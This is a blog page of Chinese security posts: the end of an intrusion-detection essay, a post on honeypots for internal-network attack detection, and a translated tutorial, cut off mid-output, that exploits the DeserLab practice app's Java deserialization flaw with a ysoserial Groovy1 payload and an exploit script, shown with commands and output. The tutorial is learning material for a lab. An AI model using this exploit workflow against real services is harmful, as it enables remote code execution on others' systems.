<p>前面所有的高标准，包括高覆盖、低误报，必须跟进到底，都是在等待这一刻。因此，我们坚持住，即使听过无数次“狼来了”，下一次仍然必须用最高的敬畏心去对待新的告警。</p>
<h1 id="AI在入侵检测领域的正确姿势"><a href="#AI在入侵检测领域的正确姿势" class="headerlink" title="AI在入侵检测领域的正确姿势"></a>AI在入侵检测领域的正确姿势</h1><p>最近这2年，不谈AI故事就不会完整。</p>
<p>只不过，随着AI概念的火爆，很多人已经把数据挖掘、统计分析的一些说法，比如分类、预测、聚类、关联之类的算法，改名字叫AI了。</p>
<p>入侵检测本质上是对数据做标记（labeling）解决方式上，可以分为分类（classify），或者聚类（cluster），区别是已有的数据是否有标签。入侵检测领域，多数没有动辄上百万的样本的可供模型去训练，也就是无法使用数据来刻画特征。</p>
<p>此时，安全领域一个比较常见的现象是，将场景转变成标记问题，要难过于通过数学模型把标记的解给求出来。也就是要业务专家先行，算法专家再跟上，而不能直接让算法专家闭门造车。</p>
<p>所以，针对一个具体的攻击场景，怎么样采集对应的入侵数据，思考这个入侵动作和正常人的区别，这个特征的提取过程，往往决定了模型最终的效果。特征决定了效果的上限，而算法模型决定了多接近这个上限。</p>
<p>如果有一个纯粹的AI团队，上来不关注攻击具体场景就用这些算法对已知样本进行训练和建模，是不可能有好的结果的。入侵检测的同学，和AI的同学，必须形成一种相互合作而不是单方面觉得高人一等的关系，才可能做出有实用价值的结果。</p>
<p>此前，笔者曾见过一个案例，AI团队产出了一个实验室环境效果极佳，但是在实际环境里却不如人意的Webshell模型。这个项目的诞生，是源自该团队试图做一个AI模型来跟传统的Webshell模型做效果对比 —— 都是在文本静态分析方面去做检测，即便AI在实验室环境的效果再好，也仍旧有漏报，而且，原团队所放弃的抵抗，也由RASP弥补过了，于是该项目事实上并未产生应有的价值。</p>
<p>这个例子并非说该团队不优秀，而是压根就不该让AI的同学去独自承担整个压力，甚至不推荐“使用AI做一个模型吧，看看是否比传统的好”这种想法，</p>
<p>我个人认为，业务同学在思考场景短板后，跟算法同学共同商议，将AI用于业务的某一个环节，而非负责整个场景，或许，是更合适的思路。</p>
<h1 id="入侵发现的运营陷阱"><a href="#入侵发现的运营陷阱" class="headerlink" title="入侵发现的运营陷阱"></a>入侵发现的运营陷阱</h1><p>入侵检测是一个苦逼的工作，任何时候手机一响，都要最紧张的去跟进 —— 又一次“狼来了”？还是一个APT高手团队唯一的破绽暴露了？</p>
<p>在内部的一个Talk上，我把这个团队称为“守夜人” —— 从今日起，日日夜夜，至死方休。没有崇高的使命感，纯粹是为了做一份工作，很难有安全技术人才可以熬得下去。别的工作都可以下班，但我们never get off 。</p>
<p>所以，借用Google的Detection团队的招聘广告里的说明，我想，应该也是我们的心声：</p>
<p>Our goal is to build a world-class fully automated detection and response machine - an automated SOC.</p>
<p>世界级的，全自动的SOC。</p>
<p>能让机器和程序自动识别的，把误报降低到最低的入侵检测效果，可能才是我们想要的生活。</p>
<p>有时候，为了快速覆盖一个入侵场景，简陋的发布了各种临时策略、临时代码架构、临时DB，随着数据量规模的增长开始变得奄奄一息。老算法的粗暴、简陋，也逐渐显得不合时宜。</p>
<p>新场景的预研、开发、建设周期需要很长，支撑平台不够完善，在定性或者追溯或者预研一些模型时，无法高效实现，甚至导致策略建设使用各种变通手法来实现一个简单的想法……</p>
<p>这些，都是入侵检测运营的一部分，也是阻碍我们达到终极目标的困难。</p>
<p>把“入侵检测能力”当作一个产品，像创业公司一样，快速发布，具备能力，先发现一些“粗糙”、“明显”的事件，可能是第一步。而随着业务发展，自己的产品和平台也一样要在高速公路上奔跑的汽车那样换轮胎，一轮又一轮重构，分工逐渐明细，在质量上精益求精，不断打磨。</p>
<p>这些事情需要公司的大力支持，因此，仅仅是通过忙碌的工作感动自己，而无法有效的输出工作本身的价值，获取公司的认同，其实是入侵检测运营工作的最大陷阱。</p>
<h1 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h1><p>PS. 腾讯高度重视入侵检测，数据保护相关的工作。该团队长期招募大神，如果你在以下方面有读到的见解，欢迎加盟我们，一起守护10亿用户的幸福。</p>
<ol>
<li>精通主流的渗透手法，可以内部演习暴露问题或者验证入侵检测效果；</li>
<li>熟悉APT组织极其攻击手法、工具，擅长捕获一手的APT细节情报，以便于指导红、蓝军改进工作方法；</li>
<li>擅长建模，可以将检测思路落地为实际代码，在上百T、数百万级别的规模下，准实时的发出告警；</li>
<li>擅长运营，可以将整个入侵检测工作相关的数据进行挖掘，暴露问题并改进，统筹应急流程，标准化并持续优化</li>
</ol>
<p>符合上述任意一类问题，简历可以投递： security@tencent.com</p>
<p>期待大神的加盟，共同对抗APT大计。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/12/27/大型互联网企业入侵检测实战总结/" data-id="cjbohpb4m000g7o1baupxygsq" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-蜜罐与内网安全" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/11/03/蜜罐与内网安全/" class="article-date">
  <time datetime="2017-11-03T06:37:51.000Z" itemprop="datePublished">2017-11-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/11/03/蜜罐与内网安全/">蜜罐与内网安全</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="0x01-蜜罐定义、分类及功能"><a href="#0x01-蜜罐定义、分类及功能" class="headerlink" title="0x01 蜜罐定义、分类及功能"></a>0x01 蜜罐定义、分类及功能</h3><p>研究Web攻防，少不了渗透测试，那在渗透测试的过程中，取得外网可访问的单台服务器权限后，下一步往往就是以所控制的服务器为跳板向未直接暴露在公网的内网服务器进行进一步渗透，俗称“内网渗透”。<br>内网往往意味着重要信息资产，数据库服务器、文件服务器等往往都部署在内网。研究内网安全保障中的内网攻击感知和攻击预警问题有实际的意义，要让网络管理员能及时察觉内部网络正在被攻击并且能够定位攻击源进而采取措施，而不至于当重要信息资产被侵害后还不自知。<br>蜜罐简单说来，是一种存在漏洞的、 暴露在网络中的一个虚假的服务（器），其价值在于被扫描、 攻击和攻陷。</p>
<p>if 系统没有对外开放任何真实的服务<br>then 任何一个对它的连接尝试都是可疑的</p>
<p>相比传统的防火墙技术和入侵检测技术，蜜罐技术更加主动和隐蔽，蜜罐的主要优势在于能诱导和记录网络攻击行为，阻止或延缓其对真正目标的攻击，而且能记录攻击日志，便于审计和回溯。<br>如果将蜜罐部署到外网，每天都能收到记录大量的攻击日志，很多只是批量的扫描，并不是针对性的攻击，这些行为说明不了什么问题。但是在内网不一样，因为默认情况下我们认为内网正常用户不会去扫描或者攻击，那么一旦内网的蜜罐捕获到可疑连接尝试，那就可以认为出现了攻击行为。<br>因此，我觉得将蜜罐技术应用到内网的攻击感知，天生就不用太考虑误报的问题，问题更聚焦。<br>通常将蜜罐(honeypot)定义为一种安全资源，它不需要提供实际的应用，蜜罐的存在价值就是诱导和记录攻击行为，从而了解攻击者的入侵方法和手段，并能够延缓其攻击进程，进而根据捕获的攻击行为数据，分析攻击者使用的攻击方法和工具，从而让防御方针对性地增强系统的安全防护能力。<br>蜜罐通常具备数据捕获、数据分析和数据控制方面的功能。数据捕获主要收集主机数据或者网络数据，主机上可以捕获攻击者的TCP连接情况、执行的命令、各种日志信息等，网络数据包括防护系统日志、网络流量数据等。但蜜罐的价值通常需要对捕获的数据进行分析后才能体现，主要包括网络协议类型分析、攻击行为分析和攻击数据包内容分析等。数据控制主要是指通过对蜜罐的对外数据发送和网络进行限制，使得当蜜罐系统被攻击者攻破时，也不会造成更多的危害。数据控制主要用来保障蜜罐本身的安全。<br>按交互程度分类：（1）低交互蜜罐（2）高交互蜜罐<br>按具体实现分类：（1）物理蜜罐（2）虚拟蜜罐<br>蜜罐技术(honeypot)就是为了改变这种被动的防护状况而出现的一种更加主动的防护技术。<br>蜜罐技术也从蜜罐发展到蜜网(honeynet)、再到分布式蜜网(distributed honeynet)和蜜场(honeyfarm)。蜜罐技术也不断应用到恶意样本捕获、入侵检测、攻击手法分析、网络取证、僵尸网络调查等安全方向。</p>
<h3 id="0x02常见的内网攻击类型及检测"><a href="#0x02常见的内网攻击类型及检测" class="headerlink" title="0x02常见的内网攻击类型及检测"></a>0x02常见的内网攻击类型及检测</h3><p>端口扫描是一种攻击初期的信息收集技术，主要用来判断目标主机是否开放相应的端口和服务，通过向目标主机发送端口连接请求，然后根据目标主机的回应信息判断目标对应端口是否开放。<br>在内网重要信息系统分布区的相邻网址部署多个被动式蜜罐可以提高内网攻击的检测覆盖率。在内网中部署两台以上的被动式蜜罐，还可以避免单点故障，以及检测蜜罐被控的情况。</p>
<h5 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h5><p>ARP欺骗的攻击过程可简要描述如下：<br>（1）攻击者在局域网段发送构造好的包含虚假IP-MAC对应信息的ARP应答包，使局域网的其他设备认为攻击者的机器是网关，从而充当假网关。<br>（2）被攻击者的将数据包发送给虚假网关。<br>（3）假网关（攻击者）分析接收到的数据包，把有价值的数据包记录下来（如邮箱、电商登录数据包）。<br>（4）假网关（攻击者）再把数据转发给真正的网关，充当中间人。<br>在内网渗透中可以通过ARP攻击嗅探到管理员的帐号密码等敏感信息。<br>通过”arp -a”命令获取到的IP-MAC对应表并非包括局域网内的全部设备，通常只包括和本机发生过数据通信的主机，但是列表中一定会包含网关，和试图攻击本机的局域网内主机，因此通过此种方法可以获取到需要的IP-MAC对应信息。</p>
<h3 id="0x03多款开源蜜罐数据样例与应用分析"><a href="#0x03多款开源蜜罐数据样例与应用分析" class="headerlink" title="0x03多款开源蜜罐数据样例与应用分析"></a>0x03多款开源蜜罐数据样例与应用分析</h3><p>了解不同蜜罐能采集的原始数据字段与内容，可以更直观地看到蜜罐的采集能力，便于我们结合应用场景解决实际问题的时候去选择和组合不同的开源蜜罐技术。</p>
<h5 id="现代密网-MHN"><a href="#现代密网-MHN" class="headerlink" title="现代密网(MHN)"></a>现代密网(MHN)</h5><p>现代密网（MHN，Modern Honey Network，以下简称MHN）是一个开源项目，它简化了蜜罐的部署并支持多种蜜罐软件作为数据终端。该项目用ThreatStream开源软件程序来部署，MHN支持将收集的数据汇总处理后保存在MongoDB数据库中，数据库的内容支持通过定制Web接口展示和存取。MHN系统功能示意如下图所示。<br><img src="/upload_image/Miwang-1.png" alt=""><br>MHN能够支持连接多种类型的蜜罐软件，添加和部署蜜罐过程相对自动化，部署完成后，蜜罐和MHN中心数据库支持通过开源的发布订阅协议hpfeeds来同步数据。</p>
<p>MHN依赖多个蜜罐终端作为探测器Sensors去探测和收集攻击数据，并通过一种基于订阅者与发布者关系的传输协议hpfeeds将蜜罐终端的数据传输到MHN中心服务器，并存储到MongoDB数据库中，再通过honeymap和Webapp模块进行展示，示例页面如下图所示。<br><img src="/upload_image/Miwang-2.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/11/03/蜜罐与内网安全/" data-id="cjbohpb4p000j7o1bizpwrz79" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Java反序列化漏洞利用的学习与实践" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/12/Java反序列化漏洞利用的学习与实践/" class="article-date">
  <time datetime="2017-09-12T11:26:33.000Z" itemprop="datePublished">2017-09-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/12/Java反序列化漏洞利用的学习与实践/">Java反序列化漏洞利用的学习与实践</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/" target="_blank" rel="external">翻译</a><br>当你在尝试学习东西的时候，一个很好的的定期提示是，阅读与实际练习中你阅读的主题不一样的主题。这就是我们为什么去实践读过的项目是有益的。我们将要深入到现在已经存在的众所周知的java反序列化bugs中。最好的实践是你可以去真正的了解手头的项目，并可以根据自己的需要尝试改进。这篇博客我们将要涉及以下内容：</p>
<ol>
<li>利用反序列化漏洞</li>
<li>手动构造我们的payload<br>要清楚的是，第一步将是使用当前的工具实践序列化漏洞的利用，并解释所采用的方法。第二步放大payload；payload究竟是什么？我们如何手工创建？最终的目的是充分了解它是如何工作的，以及掌握将来理解类似bug的方法。<br>我会提到整个博客中使用的所有工具，但是至少你需要了解如下内容：<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/NickstaDB/DeserLab</div></pre></td></tr></table></figure>
</li>
</ol>
<p>这就是我们将要利用的bug，选择一个模拟bug的原因是我们可以控制它的所有面，从而更好的理解一个反序列化漏洞的工作原理。</p>
<p>###利用Deserlab<br>首先，确保你阅读了介绍DeserLab和Java反序列化的<a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="external">blog</a><br>这篇blog对Java反序列化协议本身的深入分析。通过继续阅读本节，你将掌握DeserLab的用法。本节其余的部分，我们将使用编译的jar文件，请确认从github下载了这些文件。现在开始吧：<br>通常我处理大多数问题的方法是先了解如何以正确的方式运行，我们需要对DeserLab做如下操作：<br>    运行服务器和客户端<br>    捕获流量<br>    分析流量<br>使用如下命令运行客户端和服务器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">java -jar DeserLab.jar -server 127.0.0.1 6666</div><div class="line">java -jar DeserLab.jar -client 127.0.0.1 6666</div></pre></td></tr></table></figure></p>
<p>命令的input/output如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">java -jar DeserLab.jar -server 127.0.0.1 6666</div><div class="line"> [+] DeserServer started, listening on 127.0.0.1:6666</div><div class="line"> [+] Connection accepted from 127.0.0.1:50410</div><div class="line"> [+] Sending hello...</div><div class="line"> [+] Hello sent, waiting <span class="keyword">for</span> hello from client...</div><div class="line"> [+] Hello received from client...</div><div class="line"> [+] Sending protocol version...</div><div class="line"> [+] Version sent, waiting <span class="keyword">for</span> version from client...</div><div class="line"> [+] Client version is compatible, reading client name...</div><div class="line"> [+] Client name received: testing</div><div class="line"> [+] Hash request received, hashing: <span class="built_in">test</span></div><div class="line"> [+] Hash generated: 098f6bcd4621d373cade4e832627b4f6</div><div class="line"> [+] Done, terminating connection.</div><div class="line"></div><div class="line">java -jar DeserLab.jar -client 127.0.0.1 6666</div><div class="line"> [+] DeserClient started, connecting to 127.0.0.1:6666</div><div class="line"> [+] Connected, reading server hello packet...</div><div class="line"> [+] Hello received, sending hello to server...</div><div class="line"> [+] Hello sent, reading server protocol version...</div><div class="line"> [+] Sending supported protocol version to the server...</div><div class="line"> [+] Enter a client name to send to the server:</div><div class="line"> testing</div><div class="line"> [+] Enter a string to <span class="built_in">hash</span>:</div><div class="line"> <span class="built_in">test</span></div><div class="line"> [+] Generating <span class="built_in">hash</span> of <span class="string">"test"</span>...</div><div class="line"> [+] Hash generated: 098f6bcd4621d373cade4e832627b4f6</div></pre></td></tr></table></figure></p>
<p> 以上不是我们真正关心的问题，真正的问题是，怎么实现反序列化部分。要解答这个问题，你可以用wireshark, tcpdump ,tshark捕获6666端口的流量.要使用tcpdump捕获流量，可以执行如下命令：<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump -i lo -n -w deserlab.pcap <span class="string">'port 6666'</span></div></pre></td></tr></table></figure></p>
<p>阅读下面的内容前，用wireshark打开pcap文件。根据Nick的<a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="external">blog</a>，你至少可以识别来回传递的序列化Java对象:<br><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/normaldeser.png" alt=""></p>
<p>#####序列化数据的提取：<br>现在我们指出了序列化数据正在传输的事实，让我们开始了解实际传输的内容。我决定使用这两款实用的工具 <a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="external">SerializationDumper</a>和<a href="https://github.com/frohoff/jdeserialize/tree/master/jdeserialize" target="_blank" rel="external">jdeserialize</a>，而不是根据blog中提供的信息编写自己的解析器。在我们使用工具之前，我们需要准备数据，所以把pcap包转换成我们可以分析的数据。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r deserlab.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v <span class="string">',,'</span> | grep <span class="string">'^6666,'</span> | cut -d<span class="string">','</span> -f2 | tr <span class="string">'\n'</span> <span class="string">':'</span> | sed s/://g</div></pre></td></tr></table></figure></p>
<p>现在一行缩短了很多，现在它可以工作了。我们把他分解成可理解的块，它所做的就是把pcap数据转换成一行十六进制编码的输出字符串。它做的第一件事是将pcap转换成只包含传输数据和Tcp源端口，目的端口的文本形式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r deserlab.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=,</div></pre></td></tr></table></figure></p>
<p>看起来像这样：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">50432,,6666</div><div class="line">6666,,50432</div><div class="line">50432,,6666</div><div class="line">50432,aced0005,6666</div><div class="line">6666,,50432</div><div class="line">6666,aced0005,50432</div></pre></td></tr></table></figure></p>
<p>在像上面的代码片段中可以看到，在TCP三次握手之间没有数据，因此有,,这部分。之后客户端发送服务端确认的第一个字节，然后服务端返回一些字节等等。命令的第二部分将它转换为字符串，只需根据行开始处的端口选择有效payloads。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">| grep -v <span class="string">',,'</span> | grep <span class="string">'^6666,'</span> | cut -d<span class="string">','</span> -f2 | tr <span class="string">'\n'</span> <span class="string">':'</span> | sed s/://g</div><div class="line">以上的命令仅会选择服务器的回复，如果希望客户端数据需要更改端口好。最终转换结果显示如下所示：</div><div class="line">```bash</div><div class="line">aced00057704f000baaa77020101737200146e622e64657365722e486[...]</div></pre></td></tr></table></figure></p>
<p>这是我们可以使用的，因为它是发送和接受的数据的干净的表示。让我们使用这两个工具分析一下数据，首先我们使用SerializationDumper，然后我们将使用jdeserialize。为什么是用两个工具？因为（如果可能的话）用不同的工具来分析潜在的错误或问题是很好的做法。如果你坚持使用一个工具，可能会出错，而没有察觉。尝试不同的 工具也非常有趣。</p>
<p>#####序列化数据分析<br>使用SerializationDumper是非常简单的，因为你可以传递序列化数据的十六进制形式作为第一个参数，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar SerializationDumper-v1.0.jar aced00057704f000baaa77020101</div></pre></td></tr></table></figure></p>
<p>输出的内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">STREAM_MAGIC - 0xac ed</div><div class="line">STREAM_VERSION - 0x00 05</div><div class="line">Contents</div><div class="line"> TC_BLOCKDATA - 0x77</div><div class="line"> Length - 4 - 0x04</div><div class="line"> Contents - 0xf000baaa</div><div class="line"> TC_BLOCKDATA - 0x77</div><div class="line"> Length - 2 - 0x02</div><div class="line"> Contents - 0x0101</div><div class="line"> TC_OBJECT - 0x73</div><div class="line"> TC_CLASSDESC - 0x72</div><div class="line"> className</div><div class="line"> Length - 20 - 0x00 14</div><div class="line"> Value - nb.deser.HashRequest - 0x6e622e64657365722e4861736852657175657374</div></pre></td></tr></table></figure></p>
<p>如果我们要使用jdeserialize分析相同的序列化数据，首先要构建jdeserialize，可以使用提供的build.xml文件里的<a href="http://ant.apache.org/" target="_blank" rel="external">ant</a>。我选择了手动编译，可以通过以下命令实现：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir build</div><div class="line">javac -d ./build/ src/*</div><div class="line"><span class="built_in">cd</span> build</div><div class="line">jar cvf jdeserialize.jar *</div></pre></td></tr></table></figure></p>
<p>经过以上操作我们可以产生一个可以使用的jar文件，你可以用下面的命令测试它，它会显示帮助信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp jdeserialize.jar org.unsynchronized.jdeserialize</div></pre></td></tr></table></figure></p>
<p>由于jdeserialize需要一个文件，我们可以用如下的Python代码转换序列化数据的十六进制表示形式（注意缩短十六进制字符串以进行博客布局）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open(<span class="string">'rawser.bin'</span>,<span class="string">'wb'</span>).write(<span class="string">'aced00057704f000baaa77020146636'</span>.decode(<span class="string">'hex'</span>))</div></pre></td></tr></table></figure></p>
<p>我们现在可以通过运行jdeserialize来分析这个文件，文件名作为应该产生的第一个参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">java -cp jdeserialize.jar org.unsynchronized.jdeserialize rawser.bin</div><div class="line"> <span class="built_in">read</span>: [blockdata 0x00: 4 bytes]</div><div class="line"> <span class="built_in">read</span>: [blockdata 0x00: 2 bytes]</div><div class="line"> <span class="built_in">read</span>: nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;</div><div class="line"> //// BEGIN stream content output</div><div class="line"> [blockdata 0x00: 4 bytes]</div><div class="line"> [blockdata 0x00: 2 bytes]</div><div class="line"> nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;</div><div class="line"> //// END stream content output</div><div class="line"></div><div class="line">//// BEGIN class declarations (excluding array classes)</div><div class="line"> class nb.deser.HashRequest implements java.io.Serializable &#123;</div><div class="line"> java.lang.String dataToHash;</div><div class="line"> java.lang.String theHash;</div><div class="line"> &#125;</div><div class="line"></div><div class="line">//// END class declarations</div><div class="line"></div><div class="line">//// BEGIN instance dump</div><div class="line"> [instance 0x7e0002: 0x7e0000/nb.deser.HashRequest</div><div class="line"> field data:</div><div class="line"> 0x7e0000/nb.deser.HashRequest:</div><div class="line"> dataToHash: r0x7e0003: [String 0x7e0003: <span class="string">"test"</span>]</div><div class="line"> theHash: r0x7e0004: [String 0x7e0004: <span class="string">"098f6bcd4621d373cade4e832627b4f6"</span>]</div><div class="line"> ]</div><div class="line"> //// END instance dump</div></pre></td></tr></table></figure></p>
<p>我们从序列化数据分析工具的输出中学到的第一件事是它的序列化数据:)。我们学到的第二件事就是，事实上在客户端和服务器之间显式地传送一个对象“nb.deser.HashRequest”。如果我们将此分析与我们之前的wireshark查看的数据结合在一起，我们可以知道用户名是以TC_BLOCKDATA类型的字符串形式发送的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> TC_BLOCKDATA - 0x77</div><div class="line"> Length - 9 - 0x09</div><div class="line"> Contents - 0x000774657374696e67</div><div class="line"></div><div class="line"><span class="string">'000774657374696e67'</span>.decode(<span class="string">'hex'</span>)</div><div class="line"><span class="string">'\x00\x07testing'</span></div></pre></td></tr></table></figure></p>
<p>这让我们非常了解DeserLab客户端和DeserLab服务器如何相互通信。现在我们来看看如何使用ysoserial来利用。</p>
<h5 id="Deserlab的利用"><a href="#Deserlab的利用" class="headerlink" title="Deserlab的利用"></a>Deserlab的利用</h5><p>由于我们通过对pcap和序列化数据的分析，我们对这个通信有一个清晰的了解，我们可以用嵌入ysoserial paylaod的一些硬编码数据构建我们自己的python脚本。为了保持简单，并且和wireshark流匹配，我决定几乎完全像wireshark流一样实现它，看起来就像：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mydeser = deser(myargs.targetip, myargs.targetport)</div><div class="line">mydeser.connect()</div><div class="line">mydeser.javaserial()</div><div class="line">mydeser.protohello()</div><div class="line">mydeser.protoversion()</div><div class="line">mydeser.clientname()</div><div class="line">mydeser.exploit(myargs.payloadfile)</div></pre></td></tr></table></figure></p>
<p>你可以在<a href="https://gist.github.com/DiabloHorn/8630948d953386d2ed575e17f8635ee7" target="_blank" rel="external">这里</a>找到完整的脚本。就像你可以看到的简单的模式方法是硬编码所有java反序列化数据。你可能想知道为什么mydeser.exploit(myargs.payloadfile)函数出现在mydeser.clientname()之后。也许更重要的是我如何决定的它的位置。我们来看看我的思考过程，以及如何实际生成和发送ysoserial payload。<br>在阅读的几篇关于java反序列化的文章（blog结尾处的引用）中，我了解到：大多数漏洞与java反序列化对象有关。<br>所以据我所知，当我们审查信息交换的时候就有java对象交换。这很容易在序列化分析的过程中发现，因为它包含‘ TC_OBJECT – 0x73’或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//// BEGIN stream content output</div><div class="line">[blockdata 0x00: 4 bytes]</div><div class="line">[blockdata 0x00: 2 bytes]</div><div class="line">[blockdata 0x00: 9 bytes]</div><div class="line">nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;</div><div class="line">//// END stream content output</div></pre></td></tr></table></figure></p>
<p>我们可以清楚的看到流的最后一部分是 ‘nb.deser.HashRequest’ 对象。读取这个对象的地方也是交换的最后一部分，因此解释了为什么代码最后一部分可以exploit。<br>DeserLab本身的代码并没有真正包含任何有用的东西，我们可以通过修改序列化漏洞利用它。<br>这个问题在下一节“手动创建payload”会很明显，现在我们就接受就好了。所以这意味着我们必须寻找可能包含可以帮助我们的代码的其他库。DeserLab中只有一个Groovy库，这就提示我们要用ysoserial payload；在实际使用中，可能需要自己反编译未知的库，自己开发有用的小工具。<br>由于知道了利用使用的库，payload的生成就非常简单：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar ysoserial-master-v0.0.4-g35bce8f-67.jar Groovy1 <span class="string">'ping 127.0.0.1'</span> &gt; payload.bin</div></pre></td></tr></table></figure></p>
<p>要知道payload如何工作，需要一些方法来检测它。现在ping 到 localhost就足够了，但是在现实世界中你需要更有创意。<br>现在一切准备就绪，你会认为它只是一个关闭有效载荷的问题？你是对的，但是我们不要忘了，java序列化头交换已经发生。<br>这意味着我们要把paylaod的前四个字节单独发出去：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">./deserlab_exploit.py 127.0.0.1 6666 payload_ping_localhost.bin</div><div class="line">2017-09-07 22:58:05,401 - INFO - Connecting</div><div class="line">2017-09-07 22:58:05,401 - INFO - java serialization handshake</div><div class="line">2017-09-07 22:58:05,403 - INFO - protocol specific handshake</div><div class="line">2017-09-07 22:58:05,492 - INFO - protocol specific version handshake</div><div class="line">2017-09-07 22:58:05,571 - INFO - sending name of connected client</div><div class="line">2017-09-07 22:58:05,571 - INFO - exploiting</div></pre></td></tr></table></figure></p>
<p>如果一切顺利，你将看到以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sudo tcpdump -i lo icmp</div><div class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</div><div class="line">listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes</div><div class="line">22:58:06.215178 IP localhost &gt; localhost: ICMP <span class="built_in">echo</span> request, id 31636, seq 1, length 64</div><div class="line">22:58:06.215187 IP localhost &gt; localhost: ICMP <span class="built_in">echo</span> reply, id 31636, seq 1, length 64</div><div class="line">22:58:07.215374 IP localhost &gt; localhost: ICMP <span class="built_in">echo</span> request, id 